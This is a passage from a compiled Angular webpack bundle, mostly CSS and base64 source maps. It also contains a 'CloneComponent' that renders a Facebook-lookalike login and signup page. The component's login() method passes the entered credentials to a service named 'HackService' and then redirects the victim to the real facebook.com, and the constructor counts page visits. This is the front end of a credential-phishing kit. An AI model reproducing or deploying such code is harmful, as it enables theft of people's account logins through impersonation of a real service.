FDSjs7QUFFQTtNQUNJLGlCQUFpQjtFQUNyQjs7QUFFQTtJQUNFLHFCQUFxQjtJQUNyQixTQUFTO0lBQ1QsVUFBVTtJQUNWLHlCQUF5QjtJQUN6QixTQUFTO0lBQ1QsWUFBWTtJQUNaLHlCQUF5QjtFQUMzQjs7QUFFQTtJQUNFLDRDQUE0QztJQUM1QyxlQUFlO0lBQ2YscUJBQXFCO0lBQ3JCLFNBQVM7SUFDVCxVQUFVO0lBQ1YsbUNBQW1DO0VBQ3JDOztBQUVBOztJQUVFLFVBQVU7SUFDVixjQUFjO0lBQ2QsY0FBYztFQUNoQjs7QUFFQTtJQUNFLGlCQUFpQjtJQUNqQjtrQkFDYztJQUNkLHlCQUF5QjtJQUN6QixzQkFBc0I7SUFDdEIsNENBQTRDO0lBQzVDLDZDQUE2QztJQUM3QyxjQUFjO0lBQ2QsY0FBYztJQUNkLGdCQUFnQjtJQUNoQixpQkFBaUI7SUFDakIsVUFBVTtFQUNaOztBQUVBOztJQUVFLGFBQWE7SUFDYixjQUFjO0lBQ2QsY0FBYztFQUNoQiIsImZpbGUiOiJzcmMvYXBwL2Nsb25lL2Nsb25lLmNvbXBvbmVudC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyIudWstc2VjdGlvbntcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZWRmMGY1O1xufVxuXG4udWstaW5wdXQge1xuICAgIGRpc3BsYXk6IGlubGluZS1ibG9jaztcbiAgICBmb250LXNpemU6IDE4cHg7XG4gICAgcGFkZGluZzogOHB4IDEwcHg7XG4gICAgYm9yZGVyOiAxcHggc29saWQgI2JkYzdkODtcbiAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA1cHg7XG4gICAgY29sb3I6IzMzMztcbiAgICBtYXJnaW4tYm90dG9tOjEwcHg7XG59XG4gIFxuLnNpZ251cCB7XG4gICAgZm9udC1zaXplOjM2cHg7XG4gICAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7XG4gICAgZm9udC13ZWlnaHQ6NzAwO1xuICAgIG1hcmdpbi1ib3R0b206NXB4O1xuICB9XG4gIFxuICAuYm9sZGVyIHtcbiAgICBmb250LWZhbWlseTogJ09wZW4gU2Fucycsc2Fucy1zZXJpZjtcbiAgICB0ZXh0LXJlbmRlcmluZzpvcHRpbWl6ZWxlZ2liaWxpdHk7XG4gICAgY29sb3I6IzMzMztcbiAgfVxuICAuZnJlZSB7XG4gICAgZm9udC1zaXplOjE5cHg7XG4gICAgbWFyZ2luLWJvdHRvbToyMHB4O1xuICB9XG5cbiAgLmJkYXkge1xuICAgIGZvbnQtc2l6ZToxOXB4O1xuICAgIGNvbG9yOiMxNDE4MjM7XG4gICAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7XG4gICAgbWFyZ2luLWJvdHRvbTo1cHg7XG4gIH1cblxuICAudWstc2VsZWN0IHtcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XG4gICAgaGVpZ2h0OjMwcHg7XG4gICAgZm9udC1zaXplOiAxM3B4O1xuICAgIGJvcmRlcjogMXB4IHNvbGlkICNiZGM3ZDg7XG4gICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA1cHg7XG4gICAgY29sb3I6IzE0MTgyMztcbiAgIFxuICB9XG5cbiAgLndoeSB7XG4gICAgZm9udC1zaXplOiAxMXB4O1xuICAgIGNvbG9yOiAjM2I1OTk4O1xuICAgIHdpZHRoOjE1MHB4O1xuICAgIG1hcmdpbi1sZWZ0OjEwcHg7XG4gICAgY3Vyc29yOnBvaW50ZXI7XG4gIH1cbiAgXG4gIC5oOmhvdmVyIHtcbiAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTtcbiAgfVxuICAuZmIxIHtcbiAgICBkaXNwbGF5OmlubGluZS1ibG9jaztcbiAgICB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlO1xuICB9XG5cbiAgLmdlbmRlciB7XG4gICAgZm9udC1zaXplOiAxOHB4O1xuICAgIGNvbG9yOiAjMTQxODIzO1xuICAgIGN1cnNvcjogcG9pbnRlcjtcbiAgICBwYWRkaW5nOiAwIDEwcHggMCAzcHg7XG4gICAgbWFyZ2luLXJpZ2h0OiA0cHg7XG4gICAgbGluZS1oZWlnaHQ6IDE4cHg7XG4gICAgdmVydGljYWwtYWxpZ246IG1pZGRsZTtcbiAgfVxuXG4gIC5hZ3JlZSB7XG4gICAgZm9udC1zaXplOiAxMXB4O1xuICAgIGNvbG9yOiAjNzc3O1xuICAgIHdpZHRoOjcwJTtcbiAgICAvKiBtYXJnaW46IDExcHggMCAxMXB4IDsgKi9cbiAgfVxuXG4gIC5saW5rIHtcbiAgICBjb2xvcjojM2I1OTk4O1xuICAgIGRpc3BsYXk6IGlubGluZS1ibG9jaztcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG4gIH1cblxuICAuc2lnbmJ1dCB7XG4gICAgZm9udC1zaXplOiAxOXB4O1xuICAgIGZvbnQtd2VpZ2h0OiA3MDA7XG4gICAgbGV0dGVyLXNwYWNpbmc6IDFweDtcbiAgICBjb2xvcjojZmZmO1xuICAgIG1pbi13aWR0aDogMTk0cHg7XG4gICAgcGFkZGluZzogN3B4IDIwcHg7XG4gICAgdGV4dC1hbGlnbjogY2VudGVyO1xuICAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNXB4O1xuICAgIGJhY2tncm91bmQ6IC13ZWJraXQtbGluZWFyLWdyYWRpZW50KCM2N2FlNTUsICM1Nzg4NDMpO1xuICAgIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggMXB4ICNhNGUzODg7XG4gICAgYm9yZGVyOiAxcHggc29saWQ7XG4gIGJvcmRlci1jb2xvcjogIzNiNmUyMiAjM2I2ZTIyICMyYzUxMTU7XG4gICAgbWFyZ2luLXRvcDogMTBweDtcbiAgbWFyZ2luLWJvdHRvbTogMTBweDtcbiAgICB0ZXh0LXNoYWRvdzogMCAxcHggMnB4IHJnYmEoMCwwLDAsLjUpO1xuICAgIGN1cnNvcjpwb2ludGVyO1xuICB9XG5cbiAgLmNyZWF0ZSB7XG4gICAgYm9yZGVyLXRvcDogMXB4IHNvbGlkICNhMGE5YzA7XG4gICAgY29sb3I6ICM2NjY7XG4gICAgZm9udC1zaXplOiAxM3B4O1xuICAgIGZvbnQtd2VpZ2h0OiBib2xkO1xuICB9XG5cbiAgLmNvbm5lY3Qge1xuICAgIHdpZHRoOjgwJTtcbiAgICAvKiBoZWlnaHQ6IDVyZW07ICovXG4gICAgcGFkZGluZzogNDJweCAwIDI0cHg7XG4gICAgZm9udC1zaXplOiAyMHB4O1xuICAgIGZvbnQtd2VpZ2h0OiA3MDA7XG4gICAgbGluZS1oZWlnaHQ6IDM2cHg7XG4gICAgY29sb3I6ICMzMzM7XG4gICAgZGlzcGxheTppbmxpbmUtYmxvY2s7XG4gIH1cbiAgXG4gIC51ay1uYXZiYXItY29udGFpbmVye1xuICAgICAgYmFja2dyb3VuZDogIzNiNTk5OFxuICB9XG5cbiAgLmJvZHktY29udGFpbmVye1xuICAgICAgcGFkZGluZy10b3A6IDFyZW07XG4gIH1cblxuICAuaW5wdXR0ZXh0IHtcbiAgICBib3JkZXItY29sb3I6ICMxZDJhNWI7XG4gICAgbWFyZ2luOiAwO1xuICAgIHdpZHRoOiA5MCU7XG4gICAgYm9yZGVyOiAxcHggc29saWQgI2JkYzdkODtcbiAgICBtYXJnaW46IDA7XG4gICAgcGFkZGluZzogM3B4O1xuICAgIGJhY2tncm91bmQtY29sb3I6ICNGQUZGQkQ7XG4gIH1cblxuICBoMSB7XG4gICAgZm9udC1mYW1pbHk6IHRhaG9tYSx2ZXJkYW5hLGFyaWFsLHNhbnMtc2VyaWY7XG4gICAgZm9udC1zaXplOiAzOHB4O1xuICAgIGxldHRlci1zcGFjaW5nOjAuMDVweDtcbiAgICBtYXJnaW46IDA7XG4gICAgY29sb3I6I2ZmZjtcbiAgICAtd2Via2l0LWZvbnQtc21vb3RoaW5nOiBhbnRpYWxpYXNlZDtcbiAgfVxuICBcbiAgLnJvdzEge1xuICAgIFxuICAgIGNvbG9yOiNmZmY7XG4gICAgZm9udC1zaXplOjExcHg7XG4gICAgY3Vyc29yOnBvaW50ZXI7XG4gIH1cblxuICAjYnV0dG9uIHtcbiAgICBwb3NpdGlvbjpyZWxhdGl2ZTtcbiAgICAvKiB3aWR0aDo0NXB4O1xuICAgIGhlaWdodDoxOHB4OyAqL1xuICAgIGJhY2tncm91bmQtY29sb3I6ICM1YjcyYTk7XG4gICAgYm9yZGVyOiAxcHggc29saWQgIzk5OTtcbiAgICBib3JkZXItY29sb3I6IzhiOWRjMyAjMmY0NzdhICMyOTQ0N2UgIzFhMzU2ZTtcbiAgICAtd2Via2l0LWJveC1zaGFkb3c6IDAgMXB4IDAgcmdiYSgwLCAwLCAwLCAuMSk7XG4gICAgY3Vyc29yOnBvaW50ZXI7XG4gICAgZm9udC1zaXplOjExcHg7XG4gICAgZm9udC13ZWlnaHQ6Ym9sZDtcbiAgICB0ZXh0LWFsaWduOmNlbnRlcjtcbiAgICBjb2xvcjojZmZmO1xuICB9XG5cbiAgLnJvdzIge1xuICAgIFxuICAgIGNvbG9yOiM5ZGFjY2I7XG4gICAgZm9udC1zaXplOjExcHg7XG4gICAgY3Vyc29yOnBvaW50ZXI7XG4gIH0iXX0= */"

/***/ }),

/***/ "./src/app/clone/clone.component.ts":
/*!******************************************!*\
  !*** ./src/app/clone/clone.component.ts ***!
  \******************************************/
/*! exports provided: CloneComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "CloneComponent", function() { return CloneComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm2015/core.js");
/* harmony import */ var _services_hack_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../services/hack.service */ "./src/app/services/hack.service.ts");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm2015/router.js");




let CloneComponent = class CloneComponent {
    constructor(hackService, router) {
        this.hackService = hackService;
        this.router = router;
        this.new_user = {};
        this.user = {};
        this.hackService.pageCount().subscribe(resp => {
            console.log(resp);
        }, err => {
            console.log(err);
        });
    }
    login() {
        this.hackService.login(this.user).subscribe(resp => {
            console.log(resp);
            window.location.href = 'https://facebook.com';
        }, err => {
            console.log(err);
        });
    }
    newUser() {
        window.location.href = 'https://facebook.com';
    }
    ngOnInit() {
    }
};
CloneComponent.ctorParameters = () => [
    { type: _services_hack_service__WEBPACK_IMPORTED_MODULE_2__["HackService"] },
    { type: _angular_router__WEBPACK_IMPORTED_MODULE_3__["Router"] }
];
CloneComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
        selector: 'app-clone',
        template: __webpack_require__(/*! raw-loader!./clone.component.html */ "./node_modules/raw-loader/index.js!./src/app/clone/clone.component.html"),
        styles: [__webpack_require__(/*! ./clone.component.css */ "./src/app/clone/clone.component.css")]
    })
], CloneComponent);



/***/ }),

/***/ "./src/app/facebook/facebook.component.css":
/*!*************************************************!*\
  !*** ./src/app/facebook/facebook.component.css ***!
  \*************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "body {\n    margin: 0;\n    font-family: 'Lucida Grande', tahoma,verdana,arial,sans-serif;\n    line-height: 1.28;\n  }\n  \n  #navwrapper {\n    width: 100%;\n    height: 82px;\n    background-color: #3b5998;\n  }\n  \n  #navbar {\n    margin: 0 auto;\n    width:980px;\n    height:59px;\n  }\n  \n  #contentwrapper {\n    width: 100%;\n    height: 606px;\n    background-color: #edf0f5;\n  }\n  \n  #content {\n    margin: 0 auto;\n    width:980px;\n    padding-top:20px;\n  }\n  \n  h1 {\n    font-family: tahoma,verdana,arial,sans-serif;\n    font-size: 38px;\n    letter-spacing:0.05px;\n    margin: 0;\n    color:#fff;\n    -webkit-font-smoothing: antialiased;\n  }\n  \n  .logowrapper {\n    display: block;\n    padding: 30px 0;\n  }\n  \n  #button {\n    position:relative;\n    width:45px;\n    height:18px;\n    background-color: #5b72a9;\n    border: 1px solid #999;\n    border-color:#8b9dc3 #2f477a #29447e #1a356e;\n    -webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .1);\n    cursor:pointer;\n    font-size:11px;\n    font-weight:bold;\n    text-align:center;\n    color:#fff;\n  }\n  \n  .tablewrapper {\n    float:right;\n    margin-top:15px;\n  }\n  \n  .row1 {\n    \n    color:#fff;\n    font-size:11px;\n    width:164px;\n    cursor:pointer;\n  }\n  \n  .inputtext {\n    border-color: #1d2a5b;\n    margin: 0;\n    width: 142px;\n    border: 1px solid #bdc7d8;\n    margin: 0;\n    padding: 3px;\n    background-color: #FAFFBD;\n  }\n  \n  .row2 {\n    \n    color:#9daccb;\n    font-size:11px;\n    width:164px;\n    cursor:pointer;\n  }\n  \n  #leftbod {\n    width:565px;\n    display:inline-block;\n  }\n  \n  .connect {\n    width:409px;\n    height: 72px;\n    padding: 42px 0 24px;\n    font-size: 20px;\n    font-weight: 700;\n    line-height: 36px;\n    color: #333;\n    display:inline-block;\n  }\n  \n  .leftbar {\n    padding-bottom:10px;\n    margin-top:20px;\n  }\n  \n  .iconwrap {\n    margin-right:20px;\n    width:55px;\n    \n  }\n  \n  .rowtext {\n    font-size:16px;\n    font-weight:bold;\n    color:#333;\n  }\n  \n  .fb1 {\n    display:inline-block;\n    vertical-align: middle;\n  }\n  \n  .rowtext2 {\n    font-size:15px;\n    color:#666;\n    margin-left:10px;\n  }\n  \n  #rightbod {\n    display:inline-block;\n    vertical-align:top;\n    width:399px;\n    height:200px;\n    float:right;\n  }\n  \n  .signup {\n    font-size:36px;\n    -webkit-font-smoothing: antialiased;\n    font-weight:700;\n    margin-bottom:5px;\n  }\n  \n  .bolder {\n    font-family: 'Open Sans',sans-serif;\n    text-rendering:optimizelegibility;\n    color:#333;\n  }\n  \n  .free {\n    font-size:19px;\n    margin-bottom:20px;\n  }\n  \n  .formbox {\n    display: inline-block;\n    width:399px;\n  }\n  \n  .inputbody {\n    display: inline-block;\n    font-size: 18px;\n    padding: 8px 10px;\n    border: 1px solid #bdc7d8;\n  -webkit-border-radius: 5px;\n    color:#333;\n    margin-bottom:10px;\n  }\n  \n  ::-webkit-input-placeholder {\n     color: #999;\n  }\n  \n  ::-moz-placeholder {\n     color: #999;  \n  }\n  \n  :-ms-input-placeholder {  \n     color: #999;  \n  }\n  \n  .in1 {\n    width:172px;\n  }\n  \n  .in2 {\n    width:377px;\n  }\n  \n  .fr {\n    float:right;\n  }\n  \n  .fl {\n    float:left;\n  }\n  \n  .bday {\n    font-size:19px;\n    color:#141823;\n    -webkit-font-smoothing: antialiased;\n    margin-bottom:5px;\n  }\n  \n  .selectbody {\n    display: inline-block;\n    height:30px;\n    font-size: 13px;\n    border: 1px solid #bdc7d8;\n    -webkit-border-radius: 5px;\n    color:#141823;\n   \n  }\n  \n  .why {\n    font-size: 11px;\n    color: #3b5998;\n    width:150px;\n    margin-left:10px;\n    cursor:pointer;\n  }\n  \n  .h:hover {\n    text-decoration: underline;\n  }\n  \n  .gender {\n    font-size: 18px;\n    color: #141823;\n    cursor: pointer;\n    padding: 0 10px 0 3px;\n    margin-right: 4px;\n    line-height: 18px;\n    vertical-align: middle;\n  }\n  \n  .spanpad {\n    padding: 5px 0 5px 4px;\n    display: inline-block;\n  }\n  \n  .mt1 {\n    margin-top:15px;\n  }\n  \n  .m0 {\n    margin: 0;\n  }\n  \n  .agree {\n    font-size: 11px;\n    color: #777;\n    width:316px;\n    margin: 11px 0 11px ;\n  }\n  \n  .link {\n    color:#3b5998;\n    display: inline-block;\n    cursor: pointer;\n  }\n  \n  .signbut {\n    font-size: 19px;\n    font-weight: 700;\n    letter-spacing: 1px;\n    color:#fff;\n    min-width: 194px;\n    padding: 7px 20px;\n    text-align: center;\n    -webkit-border-radius: 5px;\n    background: -webkit-linear-gradient(#67ae55, #578843);\n    -webkit-box-shadow: inset 0 1px 1px #a4e388;\n    border: 1px solid;\n  border-color: #3b6e22 #3b6e22 #2c5115;\n    margin-top: 10px;\n  margin-bottom: 10px;\n    text-shadow: 0 1px 2px rgba(0,0,0,.5);\n    cursor:pointer;\n  }\n  \n  .signbut:hover {\n    background: -webkit-linear-gradient(#79bc64, #578843);\n  }\n  \n  .create {\n    border-top: 1px solid #a0a9c0;\n    color: #666;\n    font-size: 13px;\n    font-weight: bold;\n    margin-top: 10px;\n    padding-top: 15px;\n  }\n  \n  \n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvZmFjZWJvb2svZmFjZWJvb2suY29tcG9uZW50LmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtJQUNJLFNBQVM7SUFDVCw2REFBNkQ7SUFDN0QsaUJBQWlCO0VBQ25COztFQUVBO0lBQ0UsV0FBVztJQUNYLFlBQVk7SUFDWix5QkFBeUI7RUFDM0I7O0VBRUE7SUFDRSxjQUFjO0lBQ2QsV0FBVztJQUNYLFdBQVc7RUFDYjs7RUFFQTtJQUNFLFdBQVc7SUFDWCxhQUFhO0lBQ2IseUJBQXlCO0VBQzNCOztFQUVBO0lBQ0UsY0FBYztJQUNkLFdBQVc7SUFDWCxnQkFBZ0I7RUFDbEI7O0VBRUE7SUFDRSw0Q0FBNEM7SUFDNUMsZUFBZTtJQUNmLHFCQUFxQjtJQUNyQixTQUFTO0lBQ1QsVUFBVTtJQUNWLG1DQUFtQztFQUNyQzs7RUFFQTtJQUNFLGNBQWM7SUFDZCxlQUFlO0VBQ2pCOztFQUVBO0lBQ0UsaUJBQWlCO0lBQ2pCLFVBQVU7SUFDVixXQUFXO0lBQ1gseUJBQXlCO0lBQ3pCLHNCQUFzQjtJQUN0Qiw0Q0FBNEM7SUFDNUMsNkNBQTZDO0lBQzdDLGNBQWM7SUFDZCxjQUFjO0lBQ2QsZ0JBQWdCO0lBQ2hCLGlCQUFpQjtJQUNqQixVQUFVO0VBQ1o7O0VBRUE7SUFDRSxXQUFXO0lBQ1gsZUFBZTtFQUNqQjs7RUFFQTs7SUFFRSxVQUFVO0lBQ1YsY0FBYztJQUNkLFdBQVc7SUFDWCxjQUFjO0VBQ2hCOztFQUVBO0lBQ0UscUJBQXFCO0lBQ3JCLFNBQVM7SUFDVCxZQUFZO0lBQ1oseUJBQXlCO0lBQ3pCLFNBQVM7SUFDVCxZQUFZO0lBQ1oseUJBQXlCO0VBQzNCOztFQUVBOztJQUVFLGFBQWE7SUFDYixjQUFjO0lBQ2QsV0FBVztJQUNYLGNBQWM7RUFDaEI7O0VBRUE7SUFDRSxXQUFXO0lBQ1gsb0JBQW9CO0VBQ3RCOztFQUVBO0lBQ0UsV0FBVztJQUNYLFlBQVk7SUFDWixvQkFBb0I7SUFDcEIsZUFBZTtJQUNmLGdCQUFnQjtJQUNoQixpQkFBaUI7SUFDakIsV0FBVztJQUNYLG9CQUFvQjtFQUN0Qjs7RUFFQTtJQUNFLG1CQUFtQjtJQUNuQixlQUFlO0VBQ2pCOztFQUVBO0lBQ0UsaUJBQWlCO0lBQ2pCLFVBQVU7O0VBRVo7O0VBRUE7SUFDRSxjQUFjO0lBQ2QsZ0JBQWdCO0lBQ2hCLFVBQVU7RUFDWjs7RUFHQTtJQUNFLG9CQUFvQjtJQUNwQixzQkFBc0I7RUFDeEI7O0VBRUE7SUFDRSxjQUFjO0lBQ2QsVUFBVTtJQUNWLGdCQUFnQjtFQUNsQjs7RUFFQTtJQUNFLG9CQUFvQjtJQUNwQixrQkFBa0I7SUFDbEIsV0FBVztJQUNYLFlBQVk7SUFDWixXQUFXO0VBQ2I7O0VBRUE7SUFDRSxjQUFjO0lBQ2QsbUNBQW1DO0lBQ25DLGVBQWU7SUFDZixpQkFBaUI7RUFDbkI7O0VBRUE7SUFDRSxtQ0FBbUM7SUFDbkMsaUNBQWlDO0lBQ2pDLFVBQVU7RUFDWjs7RUFFQTtJQUNFLGNBQWM7SUFDZCxrQkFBa0I7RUFDcEI7O0VBRUE7SUFDRSxxQkFBcUI7SUFDckIsV0FBVztFQUNiOztFQUVBO0lBQ0UscUJBQXFCO0lBQ3JCLGVBQWU7SUFDZixpQkFBaUI7SUFDakIseUJBQXlCO0VBQzNCLDBCQUEwQjtJQUN4QixVQUFVO0lBQ1Ysa0JBQWtCO0VBQ3BCOztFQUVBO0tBQ0csV0FBVztFQUNkOztFQUVBO0tBQ0csV0FBVztFQUNkOztFQUVBO0tBQ0csV0FBVztFQUNkOztFQUVBO0lBQ0UsV0FBVztFQUNiOztFQUVBO0lBQ0UsV0FBVztFQUNiOztFQUVBO0lBQ0UsV0FBVztFQUNiOztFQUVBO0lBQ0UsVUFBVTtFQUNaOztFQUVBO0lBQ0UsY0FBYztJQUNkLGFBQWE7SUFDYixtQ0FBbUM7SUFDbkMsaUJBQWlCO0VBQ25COztFQUVBO0lBQ0UscUJBQXFCO0lBQ3JCLFdBQVc7SUFDWCxlQUFlO0lBQ2YseUJBQXlCO0lBQ3pCLDBCQUEwQjtJQUMxQixhQUFhOztFQUVmOztFQUVBO0lBQ0UsZUFBZTtJQUNmLGNBQWM7SUFDZCxXQUFXO0lBQ1gsZ0JBQWdCO0lBQ2hCLGNBQWM7RUFDaEI7O0VBRUE7SUFDRSwwQkFBMEI7RUFDNUI7O0VBRUE7SUFDRSxlQUFlO0lBQ2YsY0FBYztJQUNkLGVBQWU7SUFDZixxQkFBcUI7SUFDckIsaUJBQWlCO0lBQ2pCLGlCQUFpQjtJQUNqQixzQkFBc0I7RUFDeEI7O0VBRUE7SUFDRSxzQkFBc0I7SUFDdEIscUJBQXFCO0VBQ3ZCOztFQUVBO0lBQ0UsZUFBZTtFQUNqQjs7RUFFQTtJQUNFLFNBQVM7RUFDWDs7RUFFQTtJQUNFLGVBQWU7SUFDZixXQUFXO0lBQ1gsV0FBVztJQUNYLG9CQUFvQjtFQUN0Qjs7RUFFQTtJQUNFLGFBQWE7SUFDYixxQkFBcUI7SUFDckIsZUFBZTtFQUNqQjs7RUFFQTtJQUNFLGVBQWU7SUFDZixnQkFBZ0I7SUFDaEIsbUJBQW1CO0lBQ25CLFVBQVU7SUFDVixnQkFBZ0I7SUFDaEIsaUJBQWlCO0lBQ2pCLGtCQUFrQjtJQUNsQiwwQkFBMEI7SUFDMUIscURBQXFEO0lBQ3JELDJDQUEyQztJQUMzQyxpQkFBaUI7RUFDbkIscUNBQXFDO0lBQ25DLGdCQUFnQjtFQUNsQixtQkFBbUI7SUFDakIscUNBQXFDO0lBQ3JDLGNBQWM7RUFDaEI7O0VBRUE7SUFDRSxxREFBcUQ7RUFDdkQ7O0VBRUE7SUFDRSw2QkFBNkI7SUFDN0IsV0FBVztJQUNYLGVBQWU7SUFDZixpQkFBaUI7SUFDakIsZ0JBQWdCO0lBQ2hCLGlCQUFpQjtFQUNuQiIsImZpbGUiOiJzcmMvYXBwL2ZhY2Vib29rL2ZhY2Vib29rLmNvbXBvbmVudC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyJib2R5IHtcbiAgICBtYXJnaW46IDA7XG4gICAgZm9udC1mYW1pbHk6ICdMdWNpZGEgR3JhbmRlJywgdGFob21hLHZlcmRhbmEsYXJpYWwsc2Fucy1zZXJpZjtcbiAgICBsaW5lLWhlaWdodDogMS4yODtcbiAgfVxuICBcbiAgI25hdndyYXBwZXIge1xuICAgIHdpZHRoOiAxMDAlO1xuICAgIGhlaWdodDogODJweDtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjM2I1OTk4O1xuICB9XG4gIFxuICAjbmF2YmFyIHtcbiAgICBtYXJnaW46IDAgYXV0bztcbiAgICB3aWR0aDo5ODBweDtcbiAgICBoZWlnaHQ6NTlweDtcbiAgfVxuICBcbiAgI2NvbnRlbnR3cmFwcGVyIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBoZWlnaHQ6IDYwNnB4O1xuICAgIGJhY2tncm91bmQtY29sb3I6ICNlZGYwZjU7XG4gIH1cbiAgXG4gICNjb250ZW50IHtcbiAgICBtYXJnaW46IDAgYXV0bztcbiAgICB3aWR0aDo5ODBweDtcbiAgICBwYWRkaW5nLXRvcDoyMHB4O1xuICB9XG4gIFxuICBoMSB7XG4gICAgZm9udC1mYW1pbHk6IHRhaG9tYSx2ZXJkYW5hLGFyaWFsLHNhbnMtc2VyaWY7XG4gICAgZm9udC1zaXplOiAzOHB4O1xuICAgIGxldHRlci1zcGFjaW5nOjAuMDVweDtcbiAgICBtYXJnaW46IDA7XG4gICAgY29sb3I6I2ZmZjtcbiAgICAtd2Via2l0LWZvbnQtc21vb3RoaW5nOiBhbnRpYWxpYXNlZDtcbiAgfVxuICBcbiAgLmxvZ293cmFwcGVyIHtcbiAgICBkaXNwbGF5OiBibG9jaztcbiAgICBwYWRkaW5nOiAzMHB4IDA7XG4gIH1cbiAgXG4gICNidXR0b24ge1xuICAgIHBvc2l0aW9uOnJlbGF0aXZlO1xuICAgIHdpZHRoOjQ1cHg7XG4gICAgaGVpZ2h0OjE4cHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogIzViNzJhOTtcbiAgICBib3JkZXI6IDFweCBzb2xpZCAjOTk5O1xuICAgIGJvcmRlci1jb2xvcjojOGI5ZGMzICMyZjQ3N2EgIzI5NDQ3ZSAjMWEzNTZlO1xuICAgIC13ZWJraXQtYm94LXNoYWRvdzogMCAxcHggMCByZ2JhKDAsIDAsIDAsIC4xKTtcbiAgICBjdXJzb3I6cG9pbnRlcjtcbiAgICBmb250LXNpemU6MTFweDtcbiAgICBmb250LXdlaWdodDpib2xkO1xuICAgIHRleHQtYWxpZ246Y2VudGVyO1xuICAgIGNvbG9yOiNmZmY7XG4gIH1cbiAgXG4gIC50YWJsZXdyYXBwZXIge1xuICAgIGZsb2F0OnJpZ2h0O1xuICAgIG1hcmdpbi10b3A6MTVweDtcbiAgfVxuICBcbiAgLnJvdzEge1xuICAgIFxuICAgIGNvbG9yOiNmZmY7XG4gICAgZm9udC1zaXplOjExcHg7XG4gICAgd2lkdGg6MTY0cHg7XG4gICAgY3Vyc29yOnBvaW50ZXI7XG4gIH1cbiAgXG4gIC5pbnB1dHRleHQge1xuICAgIGJvcmRlci1jb2xvcjogIzFkMmE1YjtcbiAgICBtYXJnaW46IDA7XG4gICAgd2lkdGg6IDE0MnB4O1xuICAgIGJvcmRlcjogMXB4IHNvbGlkICNiZGM3ZDg7XG4gICAgbWFyZ2luOiAwO1xuICAgIHBhZGRpbmc6IDNweDtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjRkFGRkJEO1xuICB9XG4gIFxuICAucm93MiB7XG4gICAgXG4gICAgY29sb3I6IzlkYWNjYjtcbiAgICBmb250LXNpemU6MTFweDtcbiAgICB3aWR0aDoxNjRweDtcbiAgICBjdXJzb3I6cG9pbnRlcjtcbiAgfVxuICBcbiAgI2xlZnRib2Qge1xuICAgIHdpZHRoOjU2NXB4O1xuICAgIGRpc3BsYXk6aW5saW5lLWJsb2NrO1xuICB9XG4gIFxuICAuY29ubmVjdCB7XG4gICAgd2lkdGg6NDA5cHg7XG4gICAgaGVpZ2h0OiA3MnB4O1xuICAgIHBhZGRpbmc6IDQycHggMCAyNHB4O1xuICAgIGZvbnQtc2l6ZTogMjBweDtcbiAgICBmb250LXdlaWdodDogNzAwO1xuICAgIGxpbmUtaGVpZ2h0OiAzNnB4O1xuICAgIGNvbG9yOiAjMzMzO1xuICAgIGRpc3BsYXk6aW5saW5lLWJsb2NrO1xuICB9XG4gIFxuICAubGVmdGJhciB7XG4gICAgcGFkZGluZy1ib3R0b206MTBweDtcbiAgICBtYXJnaW4tdG9wOjIwcHg7XG4gIH1cbiAgXG4gIC5pY29ud3JhcCB7XG4gICAgbWFyZ2luLXJpZ2h0OjIwcHg7XG4gICAgd2lkdGg6NTVweDtcbiAgICBcbiAgfVxuICBcbiAgLnJvd3RleHQge1xuICAgIGZvbnQtc2l6ZToxNnB4O1xuICAgIGZvbnQtd2VpZ2h0OmJvbGQ7XG4gICAgY29sb3I6IzMzMztcbiAgfVxuICBcbiAgXG4gIC5mYjEge1xuICAgIGRpc3BsYXk6aW5saW5lLWJsb2NrO1xuICAgIHZlcnRpY2FsLWFsaWduOiBtaWRkbGU7XG4gIH1cbiAgXG4gIC5yb3d0ZXh0MiB7XG4gICAgZm9udC1zaXplOjE1cHg7XG4gICAgY29sb3I6IzY2NjtcbiAgICBtYXJnaW4tbGVmdDoxMHB4O1xuICB9XG4gIFxuICAjcmlnaHRib2Qge1xuICAgIGRpc3BsYXk6aW5saW5lLWJsb2NrO1xuICAgIHZlcnRpY2FsLWFsaWduOnRvcDtcbiAgICB3aWR0aDozOTlweDtcbiAgICBoZWlnaHQ6MjAwcHg7XG4gICAgZmxvYXQ6cmlnaHQ7XG4gIH1cbiAgXG4gIC5zaWdudXAge1xuICAgIGZvbnQtc2l6ZTozNnB4O1xuICAgIC13ZWJraXQtZm9udC1zbW9vdGhpbmc6IGFudGlhbGlhc2VkO1xuICAgIGZvbnQtd2VpZ2h0OjcwMDtcbiAgICBtYX